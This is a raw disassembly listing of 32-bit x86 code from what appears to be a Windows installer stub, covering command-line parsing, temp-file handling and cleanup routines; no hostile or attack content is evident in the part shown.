  4032b1:	55                   	push   %ebp
  4032b2:	ff 35 1c a0 40 00    	push   0x40a01c
  4032b8:	e8 c4 2a 00 00       	call   0x405d81
  4032bd:	85 c0                	test   %eax,%eax
  4032bf:	74 4b                	je     0x40330c
  4032c1:	01 35 48 b8 40 00    	add    %esi,0x40b848
  4032c7:	39 1d 6c b8 40 00    	cmp    %ebx,0x40b86c
  4032cd:	75 88                	jne    0x403257
  4032cf:	eb 0c                	jmp    0x4032dd
  4032d1:	39 1d 6c b8 40 00    	cmp    %ebx,0x40b86c
  4032d7:	75 37                	jne    0x403310
  4032d9:	3b fb                	cmp    %ebx,%edi
  4032db:	74 33                	je     0x403310
  4032dd:	a1 dc f8 41 00       	mov    0x41f8dc,%eax
  4032e2:	8b c8                	mov    %eax,%ecx
  4032e4:	2b 0d 48 b8 40 00    	sub    0x40b848,%ecx
  4032ea:	03 4c 24 14          	add    0x14(%esp),%ecx
  4032ee:	85 c9                	test   %ecx,%ecx
  4032f0:	0f 8f 25 ff ff ff    	jg     0x40321b
  4032f6:	53                   	push   %ebx
  4032f7:	53                   	push   %ebx
  4032f8:	50                   	push   %eax
  4032f9:	ff 35 1c a0 40 00    	push   0x40a01c
  4032ff:	ff 15 38 81 40 00    	call   *0x408138
  403305:	eb 0e                	jmp    0x403315
  403307:	83 c8 ff             	or     $0xffffffff,%eax
  40330a:	eb 13                	jmp    0x40331f
  40330c:	6a fe                	push   $0xfffffffe
  40330e:	eb 02                	jmp    0x403312
  403310:	6a fd                	push   $0xfffffffd
  403312:	58                   	pop    %eax
  403313:	eb 0a                	jmp    0x40331f
  403315:	6a 01                	push   $0x1
  403317:	e8 59 fa ff ff       	call   0x402d75
  40331c:	59                   	pop    %ecx
  40331d:	33 c0                	xor    %eax,%eax
  40331f:	5f                   	pop    %edi
  403320:	5e                   	pop    %esi
  403321:	5d                   	pop    %ebp
  403322:	5b                   	pop    %ebx
  403323:	c2 04 00             	ret    $0x4
  403326:	ff 74 24 08          	push   0x8(%esp)
  40332a:	ff 74 24 08          	push   0x8(%esp)
  40332e:	ff 35 18 a0 40 00    	push   0x40a018
  403334:	e8 19 2a 00 00       	call   0x405d52
  403339:	c2 08 00             	ret    $0x8
  40333c:	6a 00                	push   $0x0
  40333e:	6a 00                	push   $0x0
  403340:	ff 74 24 0c          	push   0xc(%esp)
  403344:	ff 35 18 a0 40 00    	push   0x40a018
  40334a:	ff 15 38 81 40 00    	call   *0x408138
  403350:	c2 04 00             	ret    $0x4
  403353:	56                   	push   %esi
  403354:	be 00 b4 42 00       	mov    $0x42b400,%esi
  403359:	56                   	push   %esi
  40335a:	e8 4c 30 00 00       	call   0x4063ab
  40335f:	56                   	push   %esi
  403360:	e8 e1 27 00 00       	call   0x405b46
  403365:	85 c0                	test   %eax,%eax
  403367:	75 02                	jne    0x40336b
  403369:	5e                   	pop    %esi
  40336a:	c3                   	ret
  40336b:	56                   	push   %esi
  40336c:	e8 68 27 00 00       	call   0x405ad9
  403371:	56                   	push   %esi
  403372:	e8 34 24 00 00       	call   0x4057ab
  403377:	56                   	push   %esi
  403378:	68 00 b0 42 00       	push   $0x42b000
  40337d:	e8 87 29 00 00       	call   0x405d09
  403382:	5e                   	pop    %esi
  403383:	c3                   	ret
  403384:	81 ec 84 01 00 00    	sub    $0x184,%esp
  40338a:	53                   	push   %ebx
  40338b:	56                   	push   %esi
  40338c:	57                   	push   %edi
  40338d:	33 db                	xor    %ebx,%ebx
  40338f:	68 01 80 00 00       	push   $0x8001
  403394:	89 5c 24 18          	mov    %ebx,0x18(%esp)
  403398:	c7 44 24 10 30 a1 40 	movl   $0x40a130,0x10(%esp)
  40339f:	00 
  4033a0:	89 5c 24 20          	mov    %ebx,0x20(%esp)
  4033a4:	c6 44 24 14 20       	movb   $0x20,0x14(%esp)
  4033a9:	ff 15 a8 80 40 00    	call   *0x4080a8
  4033af:	ff 15 a4 80 40 00    	call   *0x4080a4
  4033b5:	25 ff ff ff bf       	and    $0xbfffffff,%eax
  4033ba:	66 3d 06 00          	cmp    $0x6,%ax
  4033be:	a3 2c 47 42 00       	mov    %eax,0x42472c
  4033c3:	74 11                	je     0x4033d6
  4033c5:	53                   	push   %ebx
  4033c6:	e8 0e 31 00 00       	call   0x4064d9
  4033cb:	3b c3                	cmp    %ebx,%eax
  4033cd:	74 07                	je     0x4033d6
  4033cf:	68 00 0c 00 00       	push   $0xc00
  4033d4:	ff d0                	call   *%eax
  4033d6:	be 98 82 40 00       	mov    $0x408298,%esi
  4033db:	56                   	push   %esi
  4033dc:	e8 8a 30 00 00       	call   0x40646b
  4033e1:	56                   	push   %esi
  4033e2:	ff 15 a0 80 40 00    	call   *0x4080a0
  4033e8:	8d 74 06 01          	lea    0x1(%esi,%eax,1),%esi
  4033ec:	38 1e                	cmp    %bl,(%esi)
  4033ee:	75 eb                	jne    0x4033db
  4033f0:	6a 0a                	push   $0xa
  4033f2:	e8 e2 30 00 00       	call   0x4064d9
  4033f7:	6a 08                	push   $0x8
  4033f9:	e8 db 30 00 00       	call   0x4064d9
  4033fe:	6a 06                	push   $0x6
  403400:	a3 24 47 42 00       	mov    %eax,0x424724
  403405:	e8 cf 30 00 00       	call   0x4064d9
  40340a:	3b c3                	cmp    %ebx,%eax
  40340c:	74 0f                	je     0x40341d
  40340e:	6a 1e                	push   $0x1e
  403410:	ff d0                	call   *%eax
  403412:	85 c0                	test   %eax,%eax
  403414:	74 07                	je     0x40341d
  403416:	80 0d 2f 47 42 00 40 	orb    $0x40,0x42472f
  40341d:	55                   	push   %ebp
  40341e:	ff 15 40 80 40 00    	call   *0x408040
  403424:	53                   	push   %ebx
  403425:	ff 15 84 82 40 00    	call   *0x408284
  40342b:	a3 f8 47 42 00       	mov    %eax,0x4247f8
  403430:	53                   	push   %ebx
  403431:	8d 44 24 38          	lea    0x38(%esp),%eax
  403435:	68 60 01 00 00       	push   $0x160
  40343a:	50                   	push   %eax
  40343b:	53                   	push   %ebx
  40343c:	68 f0 fc 41 00       	push   $0x41fcf0
  403441:	ff 15 78 81 40 00    	call   *0x408178
  403447:	68 ec a1 40 00       	push   $0x40a1ec
  40344c:	68 20 3f 42 00       	push   $0x423f20
  403451:	e8 eb 2c 00 00       	call   0x406141
  403456:	ff 15 9c 80 40 00    	call   *0x40809c
  40345c:	bd 00 a0 42 00       	mov    $0x42a000,%ebp
  403461:	50                   	push   %eax
  403462:	55                   	push   %ebp
  403463:	e8 d9 2c 00 00       	call   0x406141
  403468:	80 3d 00 a0 42 00 22 	cmpb   $0x22,0x42a000
  40346f:	c7 05 20 47 42 00 00 	movl   $0x400000,0x424720
  403476:	00 40 00 
  403479:	8b c5                	mov    %ebp,%eax
  40347b:	75 0a                	jne    0x403487
  40347d:	c6 44 24 14 22       	movb   $0x22,0x14(%esp)
  403482:	b8 01 a0 42 00       	mov    $0x42a001,%eax
  403487:	ff 74 24 14          	push   0x14(%esp)
  40348b:	50                   	push   %eax
  40348c:	e8 73 26 00 00       	call   0x405b04
  403491:	50                   	push   %eax
  403492:	ff 15 2c 82 40 00    	call   *0x40822c
  403498:	89 44 24 1c          	mov    %eax,0x1c(%esp)
  40349c:	e9 c0 00 00 00       	jmp    0x403561
  4034a1:	80 f9 20             	cmp    $0x20,%cl
  4034a4:	75 06                	jne    0x4034ac
  4034a6:	40                   	inc    %eax
  4034a7:	80 38 20             	cmpb   $0x20,(%eax)
  4034aa:	74 fa                	je     0x4034a6
  4034ac:	80 38 22             	cmpb   $0x22,(%eax)
  4034af:	c6 44 24 14 20       	movb   $0x20,0x14(%esp)
  4034b4:	75 06                	jne    0x4034bc
  4034b6:	40                   	inc    %eax
  4034b7:	c6 44 24 14 22       	movb   $0x22,0x14(%esp)
  4034bc:	80 38 2f             	cmpb   $0x2f,(%eax)
  4034bf:	0f 85 8c 00 00 00    	jne    0x403551
  4034c5:	40                   	inc    %eax
  4034c6:	80 38 53             	cmpb   $0x53,(%eax)
  4034c9:	75 16                	jne    0x4034e1
  4034cb:	8a 48 01             	mov    0x1(%eax),%cl
  4034ce:	80 f9 20             	cmp    $0x20,%cl
  4034d1:	74 04                	je     0x4034d7
  4034d3:	3a cb                	cmp    %bl,%cl
  4034d5:	75 0a                	jne    0x4034e1
  4034d7:	c7 05 e0 47 42 00 01 	movl   $0x1,0x4247e0
  4034de:	00 00 00 
  4034e1:	0f be 0d e7 a1 40 00 	movsbl 0x40a1e7,%ecx
  4034e8:	0f be 15 e6 a1 40 00 	movsbl 0x40a1e6,%edx
  4034ef:	c1 e1 08             	shl    $0x8,%ecx
  4034f2:	0b ca                	or     %edx,%ecx
  4034f4:	0f be 15 e5 a1 40 00 	movsbl 0x40a1e5,%edx
  4034fb:	c1 e1 08             	shl    $0x8,%ecx
  4034fe:	0b ca                	or     %edx,%ecx
  403500:	0f be 15 e4 a1 40 00 	movsbl 0x40a1e4,%edx
  403507:	c1 e1 08             	shl    $0x8,%ecx
  40350a:	0b ca                	or     %edx,%ecx
  40350c:	39 08                	cmp    %ecx,(%eax)
  40350e:	75 11                	jne    0x403521
  403510:	8a 48 04             	mov    0x4(%eax),%cl
  403513:	80 f9 20             	cmp    $0x20,%cl
  403516:	74 04                	je     0x40351c
  403518:	3a cb                	cmp    %bl,%cl
  40351a:	75 05                	jne    0x403521
  40351c:	83 4c 24 20 04       	orl    $0x4,0x20(%esp)
  403521:	0f be 0d df a1 40 00 	movsbl 0x40a1df,%ecx
  403528:	0f be 15 de a1 40 00 	movsbl 0x40a1de,%edx
  40352f:	c1 e1 08             	shl    $0x8,%ecx
  403532:	0b ca                	or     %edx,%ecx
  403534:	0f be 15 dd a1 40 00 	movsbl 0x40a1dd,%edx
  40353b:	c1 e1 08             	shl    $0x8,%ecx
  40353e:	0b ca                	or     %edx,%ecx
  403540:	0f be 15 dc a1 40 00 	movsbl 0x40a1dc,%edx
  403547:	c1 e1 08             	shl    $0x8,%ecx
  40354a:	0b ca                	or     %edx,%ecx
  40354c:	39 48 fe             	cmp    %ecx,-0x2(%eax)
  40354f:	74 1c                	je     0x40356d
  403551:	ff 74 24 14          	push   0x14(%esp)
  403555:	50                   	push   %eax
  403556:	e8 a9 25 00 00       	call   0x405b04
  40355b:	80 38 22             	cmpb   $0x22,(%eax)
  40355e:	75 01                	jne    0x403561
  403560:	40                   	inc    %eax
  403561:	8a 08                	mov    (%eax),%cl
  403563:	3a cb                	cmp    %bl,%cl
  403565:	0f 85 36 ff ff ff    	jne    0x4034a1
  40356b:	eb 11                	jmp    0x40357e
  40356d:	88 58 fe             	mov    %bl,-0x2(%eax)
  403570:	83 c0 02             	add    $0x2,%eax
  403573:	50                   	push   %eax
  403574:	68 00 a4 42 00       	push   $0x42a400
  403579:	e8 c3 2b 00 00       	call   0x406141
  40357e:	8b 3d 98 80 40 00    	mov    0x408098,%edi
  403584:	be 00 b4 42 00       	mov    $0x42b400,%esi
  403589:	56                   	push   %esi
  40358a:	68 00 04 00 00       	push   $0x400
  40358f:	ff d7                	call   *%edi
  403591:	e8 bd fd ff ff       	call   0x403353
  403596:	85 c0                	test   %eax,%eax
  403598:	75 56                	jne    0x4035f0
  40359a:	68 fb 03 00 00       	push   $0x3fb
  40359f:	56                   	push   %esi
  4035a0:	ff 15 94 80 40 00    	call   *0x408094
  4035a6:	68 d4 a1 40 00       	push   $0x40a1d4
  4035ab:	56                   	push   %esi
  4035ac:	e8 ac 2b 00 00       	call   0x40615d
  4035b1:	e8 9d fd ff ff       	call   0x403353
  4035b6:	85 c0                	test   %eax,%eax
  4035b8:	75 36                	jne    0x4035f0
  4035ba:	56                   	push   %esi
  4035bb:	68 fc 03 00 00       	push   $0x3fc
  4035c0:	ff d7                	call   *%edi
  4035c2:	68 d0 a1 40 00       	push   $0x40a1d0
  4035c7:	56                   	push   %esi
  4035c8:	e8 90 2b 00 00       	call   0x40615d
  4035cd:	8b 3d 70 80 40 00    	mov    0x408070,%edi
  4035d3:	56                   	push   %esi
  4035d4:	68 c8 a1 40 00       	push   $0x40a1c8
  4035d9:	ff d7                	call   *%edi
  4035db:	56                   	push   %esi
  4035dc:	68 c4 a1 40 00       	push   $0x40a1c4
  4035e1:	ff d7                	call   *%edi
  4035e3:	e8 6b fd ff ff       	call   0x403353
  4035e8:	85 c0                	test   %eax,%eax
  4035ea:	0f 84 ae 00 00 00    	je     0x40369e
  4035f0:	68 00 b0 42 00       	push   $0x42b000
  4035f5:	ff 15 28 81 40 00    	call   *0x408128
  4035fb:	ff 74 24 20          	push   0x20(%esp)
  4035ff:	e8 10 f8 ff ff       	call   0x402e14
  403604:	3b c3                	cmp    %ebx,%eax
  403606:	89 44 24 10          	mov    %eax,0x10(%esp)
  40360a:	0f 85 8e 00 00 00    	jne    0x40369e
  403610:	39 1d 40 47 42 00    	cmp    %ebx,0x424740
  403616:	74 76                	je     0x40368e
  403618:	53                   	push   %ebx
  403619:	55                   	push   %ebp
  40361a:	e8 e5 24 00 00       	call   0x405b04
  40361f:	8b f8                	mov    %eax,%edi
  403621:	3b fd                	cmp    %ebp,%edi
  403623:	72 34                	jb     0x403659
  403625:	0f be 05 bf a1 40 00 	movsbl 0x40a1bf,%eax
  40362c:	0f be 0d be a1 40 00 	movsbl 0x40a1be,%ecx
  403633:	c1 e0 08             	shl    $0x8,%eax
  403636:	0b c1                	or     %ecx,%eax
  403638:	0f be 0d bd a1 40 00 	movsbl 0x40a1bd,%ecx
  40363f:	c1 e0 08             	shl    $0x8,%eax
  403642:	0b c1                	or     %ecx,%eax
  403644:	0f be 0d bc a1 40 00 	movsbl 0x40a1bc,%ecx
  40364b:	c1 e0 08             	shl    $0x8,%eax
  40364e:	0b c1                	or     %ecx,%eax
  403650:	39 07                	cmp    %eax,(%edi)
  403652:	74 05                	je     0x403659
  403654:	4f                   	dec    %edi
  403655:	3b fd                	cmp    %ebp,%edi
  403657:	73 f7                	jae    0x403650
  403659:	3b fd                	cmp    %ebp,%edi
  40365b:	c7 44 24 10 74 a1 40 	movl   $0x40a174,0x10(%esp)
  403662:	00 
  403663:	72 65                	jb     0x4036ca
  403665:	88 1f                	mov    %bl,(%edi)
  403667:	83 c7 04             	add    $0x4,%edi
  40366a:	57                   	push   %edi
  40366b:	e8 57 25 00 00       	call   0x405bc7
  403670:	85 c0                	test   %eax,%eax
  403672:	74 2a                	je     0x40369e
  403674:	57                   	push   %edi
  403675:	68 00 a4 42 00       	push   $0x42a400
  40367a:	e8 c2 2a 00 00       	call   0x406141
  40367f:	57                   	push   %edi
  403680:	68 00 a8 42 00       	push   $0x42a800
  403685:	e8 b7 2a 00 00       	call   0x406141
  40368a:	89 5c 24 10          	mov    %ebx,0x10(%esp)
  40368e:	83 0d ec 47 42 00 ff 	orl    $0xffffffff,0x4247ec
  403695:	e8 c4 02 00 00       	call   0x40395e
  40369a:	89 44 24 18          	mov    %eax,0x18(%esp)
  40369e:	e8 c9 01 00 00       	call   0x40386c
  4036a3:	ff 15 80 82 40 00    	call   *0x408280
  4036a9:	39 5c 24 10          	cmp    %ebx,0x10(%esp)
  4036ad:	5d                   	pop    %ebp
  4036ae:	0f 84 1e 01 00 00    	je     0x4037d2
  4036b4:	68 10 00 20 00       	push   $0x200010
  4036b9:	ff 74 24 10          	push   0x10(%esp)
  4036bd:	e8 9b 21 00 00       	call   0x40585d
  4036c2:	6a 02                	push   $0x2
  4036c4:	ff 15 b0 80 40 00    	call   *0x4080b0
  4036ca:	e8 f9 20 00 00       	call   0x4057c8
  4036cf:	68 b4 a1 40 00       	push   $0x40a1b4
  4036d4:	56                   	push   %esi
  4036d5:	8b f8                	mov    %eax,%edi
  4036d7:	e8 81 2a 00 00       	call   0x40615d
  4036dc:	3b fb                	cmp    %ebx,%edi
  4036de:	74 0b                	je     0x4036eb
  4036e0:	68 b0 a1 40 00       	push   $0x40a1b0
  4036e5:	56                   	push   %esi
  4036e6:	e8 72 2a 00 00       	call   0x40615d
  4036eb:	68 a8 a1 40 00       	push   $0x40a1a8
  4036f0:	56                   	push   %esi
  4036f1:	e8 67 2a 00 00       	call   0x40615d
  4036f6:	bd 00 ac 42 00       	mov    $0x42ac00,%ebp
  4036fb:	55                   	push   %ebp
  4036fc:	56                   	push   %esi
  4036fd:	ff 15 18 81 40 00    	call   *0x408118
  403703:	85 c0                	test   %eax,%eax
  403705:	74 97                	je     0x40369e
  403707:	3b fb                	cmp    %ebx,%edi
  403709:	56                   	push   %esi
  40370a:	74 07                	je     0x403713
  40370c:	e8 1d 20 00 00       	call   0x40572e
  403711:	eb 05                	jmp    0x403718
  403713:	e8 93 20 00 00       	call   0x4057ab
  403718:	56                   	push   %esi
  403719:	ff 15 00 81 40 00    	call   *0x408100
  40371f:	38 1d 00 a4 42 00    	cmp    %bl,0x42a400
  403725:	75 0b                	jne    0x403732
  403727:	55                   	push   %ebp
  403728:	68 00 a4 42 00       	push   $0x42a400
  40372d:	e8 0f 2a 00 00       	call   0x406141
  403732:	ff 74 24 1c          	push   0x1c(%esp)
  403736:	68 00 50 42 00       	push   $0x425000
  40373b:	e8 01 2a 00 00       	call   0x406141
  403740:	66 0f be 0d a4 a1 40 	movsbw 0x40a1a4,%cx
  403747:	00 
  403748:	33 c0                	xor    %eax,%eax
  40374a:	6a 1a                	push   $0x1a
  40374c:	8a 25 a5 a1 40 00    	mov    0x40a1a5,%ah
  403752:	5d                   	pop    %ebp
  403753:	0b c1                	or     %ecx,%eax
  403755:	bf f0 f8 41 00       	mov    $0x41f8f0,%edi
  40375a:	66 a3 00 54 42 00    	mov    %ax,0x425400
  403760:	a1 34 47 42 00       	mov    0x424734,%eax
  403765:	ff b0 20 01 00 00    	push   0x120(%eax)
  40376b:	57                   	push   %edi
  40376c:	e8 f2 29 00 00       	call   0x406163
  403771:	57                   	push   %edi
  403772:	ff 15 28 81 40 00    	call   *0x408128
  403778:	39 5c 24 10          	cmp    %ebx,0x10(%esp)
  40377c:	74 3f                	je     0x4037bd
  40377e:	6a 01                	push   $0x1
  403780:	57                   	push   %edi
  403781:	68 00 bc 42 00       	push   $0x42bc00
  403786:	ff 15 88 80 40 00    	call   *0x408088
  40378c:	85 c0                	test   %eax,%eax
  40378e:	74 2d                	je     0x4037bd
  403790:	53                   	push   %ebx
  403791:	57                   	push   %edi
  403792:	e8 89 27 00 00       	call   0x405f20
  403797:	a1 34 47 42 00       	mov    0x424734,%eax
  40379c:	ff b0 24 01 00 00    	push   0x124(%eax)
  4037a2:	57                   	push   %edi
  4037a3:	e8 bb 29 00 00       	call   0x406163
  4037a8:	57                   	push   %edi
  4037a9:	e8 32 20 00 00       	call   0x4057e0
  4037ae:	3b c3                	cmp    %ebx,%eax
  4037b0:	74 0b                	je     0x4037bd
  4037b2:	50                   	push   %eax
  4037b3:	ff 15 14 81 40 00    	call   *0x408114
  4037b9:	89 5c 24 10          	mov    %ebx,0x10(%esp)
  4037bd:	fe 05 00 54 42 00    	incb   0x425400
  4037c3:	4d                   	dec    %ebp
  4037c4:	75 9a                	jne    0x403760
  4037c6:	53                   	push   %ebx
  4037c7:	56                   	push   %esi
  4037c8:	e8 53 27 00 00       	call   0x405f20
  4037cd:	e9 cc fe ff ff       	jmp    0x40369e
  4037d2:	39 1d d4 47 42 00    	cmp    %ebx,0x4247d4
  4037d8:	74 7a                	je     0x403854
  4037da:	8d 44 24 18          	lea    0x18(%esp),%eax
  4037de:	50                   	push   %eax
  4037df:	6a 28                	push   $0x28
  4037e1:	ff 15 84 80 40 00    	call   *0x408084
  4037e7:	50                   	push   %eax
  4037e8:	ff 15 10 80 40 00    	call   *0x408010
  4037ee:	6a 02                	push   $0x2
  4037f0:	85 c0                	test   %eax,%eax
  4037f2:	5f                   	pop    %edi
  4037f3:	74 30                	je     0x403825
  4037f5:	8d 44 24 24          	lea    0x24(%esp),%eax
  4037f9:	50                   	push   %eax
  4037fa:	68 90 a1 40 00       	push   $0x40a190
  4037ff:	53                   	push   %ebx
  403800:	ff 15 14 80 40 00    	call   *0x408014
  403806:	53                   	push   %ebx
  403807:	53                   	push   %ebx
  403808:	8d 44 24 28          	lea    0x28(%esp),%eax
  40380c:	53                   	push   %ebx
  40380d:	50                   	push   %eax
  40380e:	53                   	push   %ebx
  40380f:	ff 74 24 2c          	push   0x2c(%esp)
  403813:	c7 44 24 38 01 00 00 	movl   $0x1,0x38(%esp)
  40381a:	00 
  40381b:	89 7c 24 44          	mov    %edi,0x44(%esp)
  40381f:	ff 15 00 80 40 00    	call   *0x408000
  403825:	6a 04                	push   $0x4
  403827:	e8 ad 2c 00 00       	call   0x4064d9
  40382c:	3b c3                	cmp    %ebx,%eax
  40382e:	be 02 00 04 80       	mov    $0x80040002,%esi
  403833:	74 0c                	je     0x403841
  403835:	56                   	push   %esi
  403836:	6a 25                	push   $0x25
  403838:	53                   	push   %ebx
  403839:	53                   	push   %ebx
  40383a:	53                   	push   %ebx
  40383b:	ff d0                	call   *%eax
  40383d:	85 c0                	test   %eax,%eax
  40383f:	74 0c                	je     0x40384d
  403841:	56                   	push   %esi
  403842:	57                   	push   %edi
  403843:	ff 15 30 82 40 00    	call   *0x408230
  403849:	85 c0                	test   %eax,%eax
  40384b:	75 07                	jne    0x403854
  40384d:	6a 09                	push   $0x9
  40384f:	e8 b7 db ff ff       	call   0x40140b
  403854:	a1 ec 47 42 00       	mov    0x4247ec,%eax
  403859:	83 f8 ff             	cmp    $0xffffffff,%eax
  40385c:	74 04                	je     0x403862
  40385e:	89 44 24 14          	mov    %eax,0x14(%esp)
  403862:	ff 74 24 14          	push   0x14(%esp)
  403866:	ff 15 b0 80 40 00    	call   *0x4080b0
  40386c:	a1 18 a0 40 00       	mov    0x40a018,%eax
  403871:	56                   	push   %esi
  403872:	8b 35 14 81 40 00    	mov    0x408114,%esi
  403878:	83 f8 ff             	cmp    $0xffffffff,%eax
  40387b:	74 0a                	je     0x403887
  40387d:	50                   	push   %eax
  40387e:	ff d6                	call   *%esi
  403880:	83 0d 18 a0 40 00 ff 	orl    $0xffffffff,0x40a018
  403887:	a1 1c a0 40 00       	mov    0x40a01c,%eax
  40388c:	83 f8 ff             	cmp    $0xffffffff,%eax
  40388f:	74 0a                	je     0x40389b
  403891:	50                   	push   %eax
  403892:	ff d6                	call   *%esi
  403894:	83 0d 1c a0 40 00 ff 	orl    $0xffffffff,0x40a01c
  40389b:	e8 29 00 00 00       	call   0x4038c9
  4038a0:	6a 07                	push   $0x7
  4038a2:	68 00 b8 42 00       	push   $0x42b800
  4038a7:	e8 5d 20 00 00       	call   0x405909
  4038ac:	5e                   	pop    %esi
  4038ad:	c3                   	ret
  4038ae:	56                   	push   %esi
  4038af:	8b 35 f4 fc 41 00    	mov    0x41fcf4,%esi
  4038b5:	eb 0a                	jmp    0x4038c1
  4038b7:	ff 74 24 08          	push   0x8(%esp)
  4038bb:	ff 56 04             	call   *0x4(%esi)
  4038be:	8b 36                	mov    (%esi),%esi
  4038c0:	59                   	pop    %ecx
  4038c1:	85 f6                	test   %esi,%esi
  4038c3:	75 f2                	jne    0x4038b7
  4038c5:	5e                   	pop    %esi
  4038c6:	c2 04 00             	ret    $0x4
  4038c9:	56                   	push   %esi
  4038ca:	8b 35 f4 fc 41 00    	mov    0x41fcf4,%esi
  4038d0:	6a 00                	push   $0x0
  4038d2:	e8 d7 ff ff ff       	call   0x4038ae
  4038d7:	85 f6                	test   %esi,%esi
  4038d9:	74 1a                	je     0x4038f5
  4038db:	57                   	push   %edi
  4038dc:	8b fe                	mov    %esi,%edi
  4038de:	8b 36                	mov    (%esi),%esi
  4038e0:	ff 77 08             	push   0x8(%edi)
  4038e3:	ff 15 4c 81 40 00    	call   *0x40814c
  4038e9:	57                   	push   %edi
  4038ea:	ff 15 5c 81 40 00    	call   *0x40815c
  4038f0:	85 f6                	test   %esi,%esi
  4038f2:	75 e8                	jne    0x4038dc
  4038f4:	5f                   	pop    %edi
  4038f5:	83 25 f4 fc 41 00 00 	andl   $0x0,0x41fcf4
  4038fc:	5e                   	pop    %esi
  4038fd:	c3                   	ret
  4038fe:	a1 f4 fc 41 00       	mov    0x41fcf4,%eax
  403903:	eb 0b                	jmp    0x403910
  403905:	8b 48 08             	mov    0x8(%eax),%ecx
  403908:	3b 4c 24 04          	cmp    0x4(%esp),%ecx
  40390c:	74 0a                	je     0x403918
  40390e:	8b 00                	mov    (%eax),%eax
  403910:	85 c0                	test   %eax,%eax
  403912:	75 f1                	jne    0x403905
  403914:	40                   	inc    %eax
  403915:	c2 04 00             	ret    $0x4
  403918:	33 c0                	xor    %eax,%eax
  40391a:	eb f9                	jmp    0x403915
  40391c:	56                   	push   %esi
  40391d:	8b 74 24 08          	mov    0x8(%esp),%esi
  403921:	56                   	push   %esi
  403922:	e8 d7 ff ff ff       	call   0x4038fe
  403927:	85 c0                	test   %eax,%eax
  403929:	75 03                	jne    0x40392e
  40392b:	40                   	inc    %eax
  40392c:	eb 2c                	jmp    0x40395a
  40392e:	6a 0c                	push   $0xc
  403930:	6a 40                	push   $0x40
  403932:	ff 15 58 81 40 00    	call   *0x408158
  403938:	85 c0                	test   %eax,%eax
  40393a:	74 1b                	je     0x403957
  40393c:	8b 4c 24 0c          	mov    0xc(%esp),%ecx
  403940:	89 70 08             	mov    %esi,0x8(%eax)
  403943:	89 48 04             	mov    %ecx,0x4(%eax)
  403946:	8b 0d f4 fc 41 00    	mov    0x41fcf4,%ecx
  40394c:	89 08                	mov    %ecx,(%eax)
  40394e:	a3 f4 fc 41 00       	mov    %eax,0x41fcf4
  403953:	33 c0                	xor    %eax,%eax
  403955:	eb 03                	jmp    0x40395a
  403957:	83 c8 ff             	or     $0xffffffff,%eax
  40395a:	5e                   	pop    %esi
  40395b:	c2 08 00             	ret    $0x8
  40395e:	83 ec 10             	sub    $0x10,%esp
  403961:	53                   	push   %ebx
  403962:	55                   	push   %ebp
  403963:	56                   	push   %esi
  403964:	8b 35 34 47 42 00    	mov    0x424734,%esi
  40396a:	57                   	push   %edi
  40396b:	6a 02                	push   $0x2
  40396d:	e8 67 2b 00 00       	call   0x4064d9
  403972:	33 db                	xor    %ebx,%ebx
  403974:	3b c3                	cmp    %ebx,%eax
  403976:	74 12                	je     0x40398a
  403978:	ff d0                	call   *%eax
  40397a:	0f b7 c0             	movzwl %ax,%eax
  40397d:	50                   	push   %eax
  40397e:	68 00 b0 42 00       	push   $0x42b000
  403983:	e8 17 27 00 00       	call   0x40609f
  403988:	eb 54                	jmp    0x4039de
  40398a:	bf 30 0d 42 00       	mov    $0x420d30,%edi
  40398f:	53                   	push   %ebx
  403990:	57                   	push   %edi
  403991:	53                   	push   %ebx
  403992:	68 44 83 40 00       	push   $0x408344
  403997:	68 01 00 00 80       	push   $0x80000001
  40399c:	c6 05 00 b0 42 00 30 	movb   $0x30,0x42b000
  4039a3:	c6 05 01 b0 42 00 78 	movb   $0x78,0x42b001
  4039aa:	88 1d 02 b0 42 00    	mov    %bl,0x42b002
  4039b0:	e8 73 26 00 00       	call   0x406028
  4039b5:	38 1d 30 0d 42 00    	cmp    %bl,0x420d30
  4039bb:	75 16                	jne    0x4039d3
  4039bd:	53                   	push   %ebx
  4039be:	57                   	push   %edi
  4039bf:	68 62 83 40 00       	push   $0x408362
  4039c4:	68 1c 83 40 00       	push   $0x40831c
  4039c9:	68 03 00 00 80       	push   $0x80000003
  4039ce:	e8 55 26 00 00       	call   0x406028
  4039d3:	57                   	push   %edi
  4039d4:	68 00 b0 42 00       	push   $0x42b000
  4039d9:	e8 7f 27 00 00       	call   0x40615d
  4039de:	e8 40 02 00 00       	call   0x403c23
  4039e3:	a1 3c 47 42 00       	mov    0x42473c,%eax
  4039e8:	bd 00 a4 42 00       	mov    $0x42a400,%ebp
  4039ed:	83 e0 20             	and    $0x20,%eax
  4039f0:	55                   	push   %ebp
  4039f1:	a3 c0 47 42 00       	mov    %eax,0x4247c0
  4039f6:	c7 05 dc 47 42 00 00 	movl   $0x10000,0x4247dc
  4039fd:	00 01 00 
  403a00:	e8 c2 21 00 00       	call   0x405bc7
  403a05:	85 c0                	test   %eax,%eax
  403a07:	0f 85 81 00 00 00    	jne    0x403a8e
  403a0d:	8b 4e 48             	mov    0x48(%esi),%ecx
  403a10:	3b cb                	cmp    %ebx,%ecx
  403a12:	74 7a                	je     0x403a8e
  403a14:	8b 56 4c             	mov    0x4c(%esi),%edx
  403a17:	a1 78 47 42 00       	mov    0x424778,%eax
  403a1c:	bf c0 36 42 00       	mov    $0x4236c0,%edi
  403a21:	53                   	push   %ebx
  403a22:	03 d0                	add    %eax,%edx
  403a24:	57                   	push   %edi
  403a25:	03 c8                	add    %eax,%ecx
  403a27:	52                   	push   %edx
  403a28:	51                   	push   %ecx
  403a29:	ff 76 44             	push   0x44(%esi)
  403a2c:	e8 f7 25 00 00       	call   0x406028
  403a31:	a0 c0 36 42 00       	mov    0x4236c0,%al
  403a36:	3a c3                	cmp    %bl,%al
  403a38:	74 54                	je     0x403a8e
  403a3a:	3c 22                	cmp    $0x22,%al
  403a3c:	75 0f                	jne    0x403a4d
  403a3e:	bf c1 36 42 00       	mov    $0x4236c1,%edi
  403a43:	6a 22                	push   $0x22
  403a45:	57                   	push   %edi
  403a46:	e8 b9 20 00 00       	call   0x405b04
  403a4b:	88 18                	mov    %bl,(%eax)
  403a4d:	57                   	push   %edi
  403a4e:	e8 04 27 00 00       	call   0x406157
  403a53:	8d 44 38 fc          	lea    -0x4(%eax,%edi,1),%eax
  403a57:	3b c7                	cmp    %edi,%eax
  403a59:	76 26                	jbe    0x403a81
  403a5b:	68 14 a2 40 00       	push   $0x40a214
  403a60:	50                   	push   %eax
  403a61:	ff 15 18 81 40 00    	call   *0x408118
  403a67:	85 c0                	test   %eax,%eax
  403a69:	75 16                	jne    0x403a81
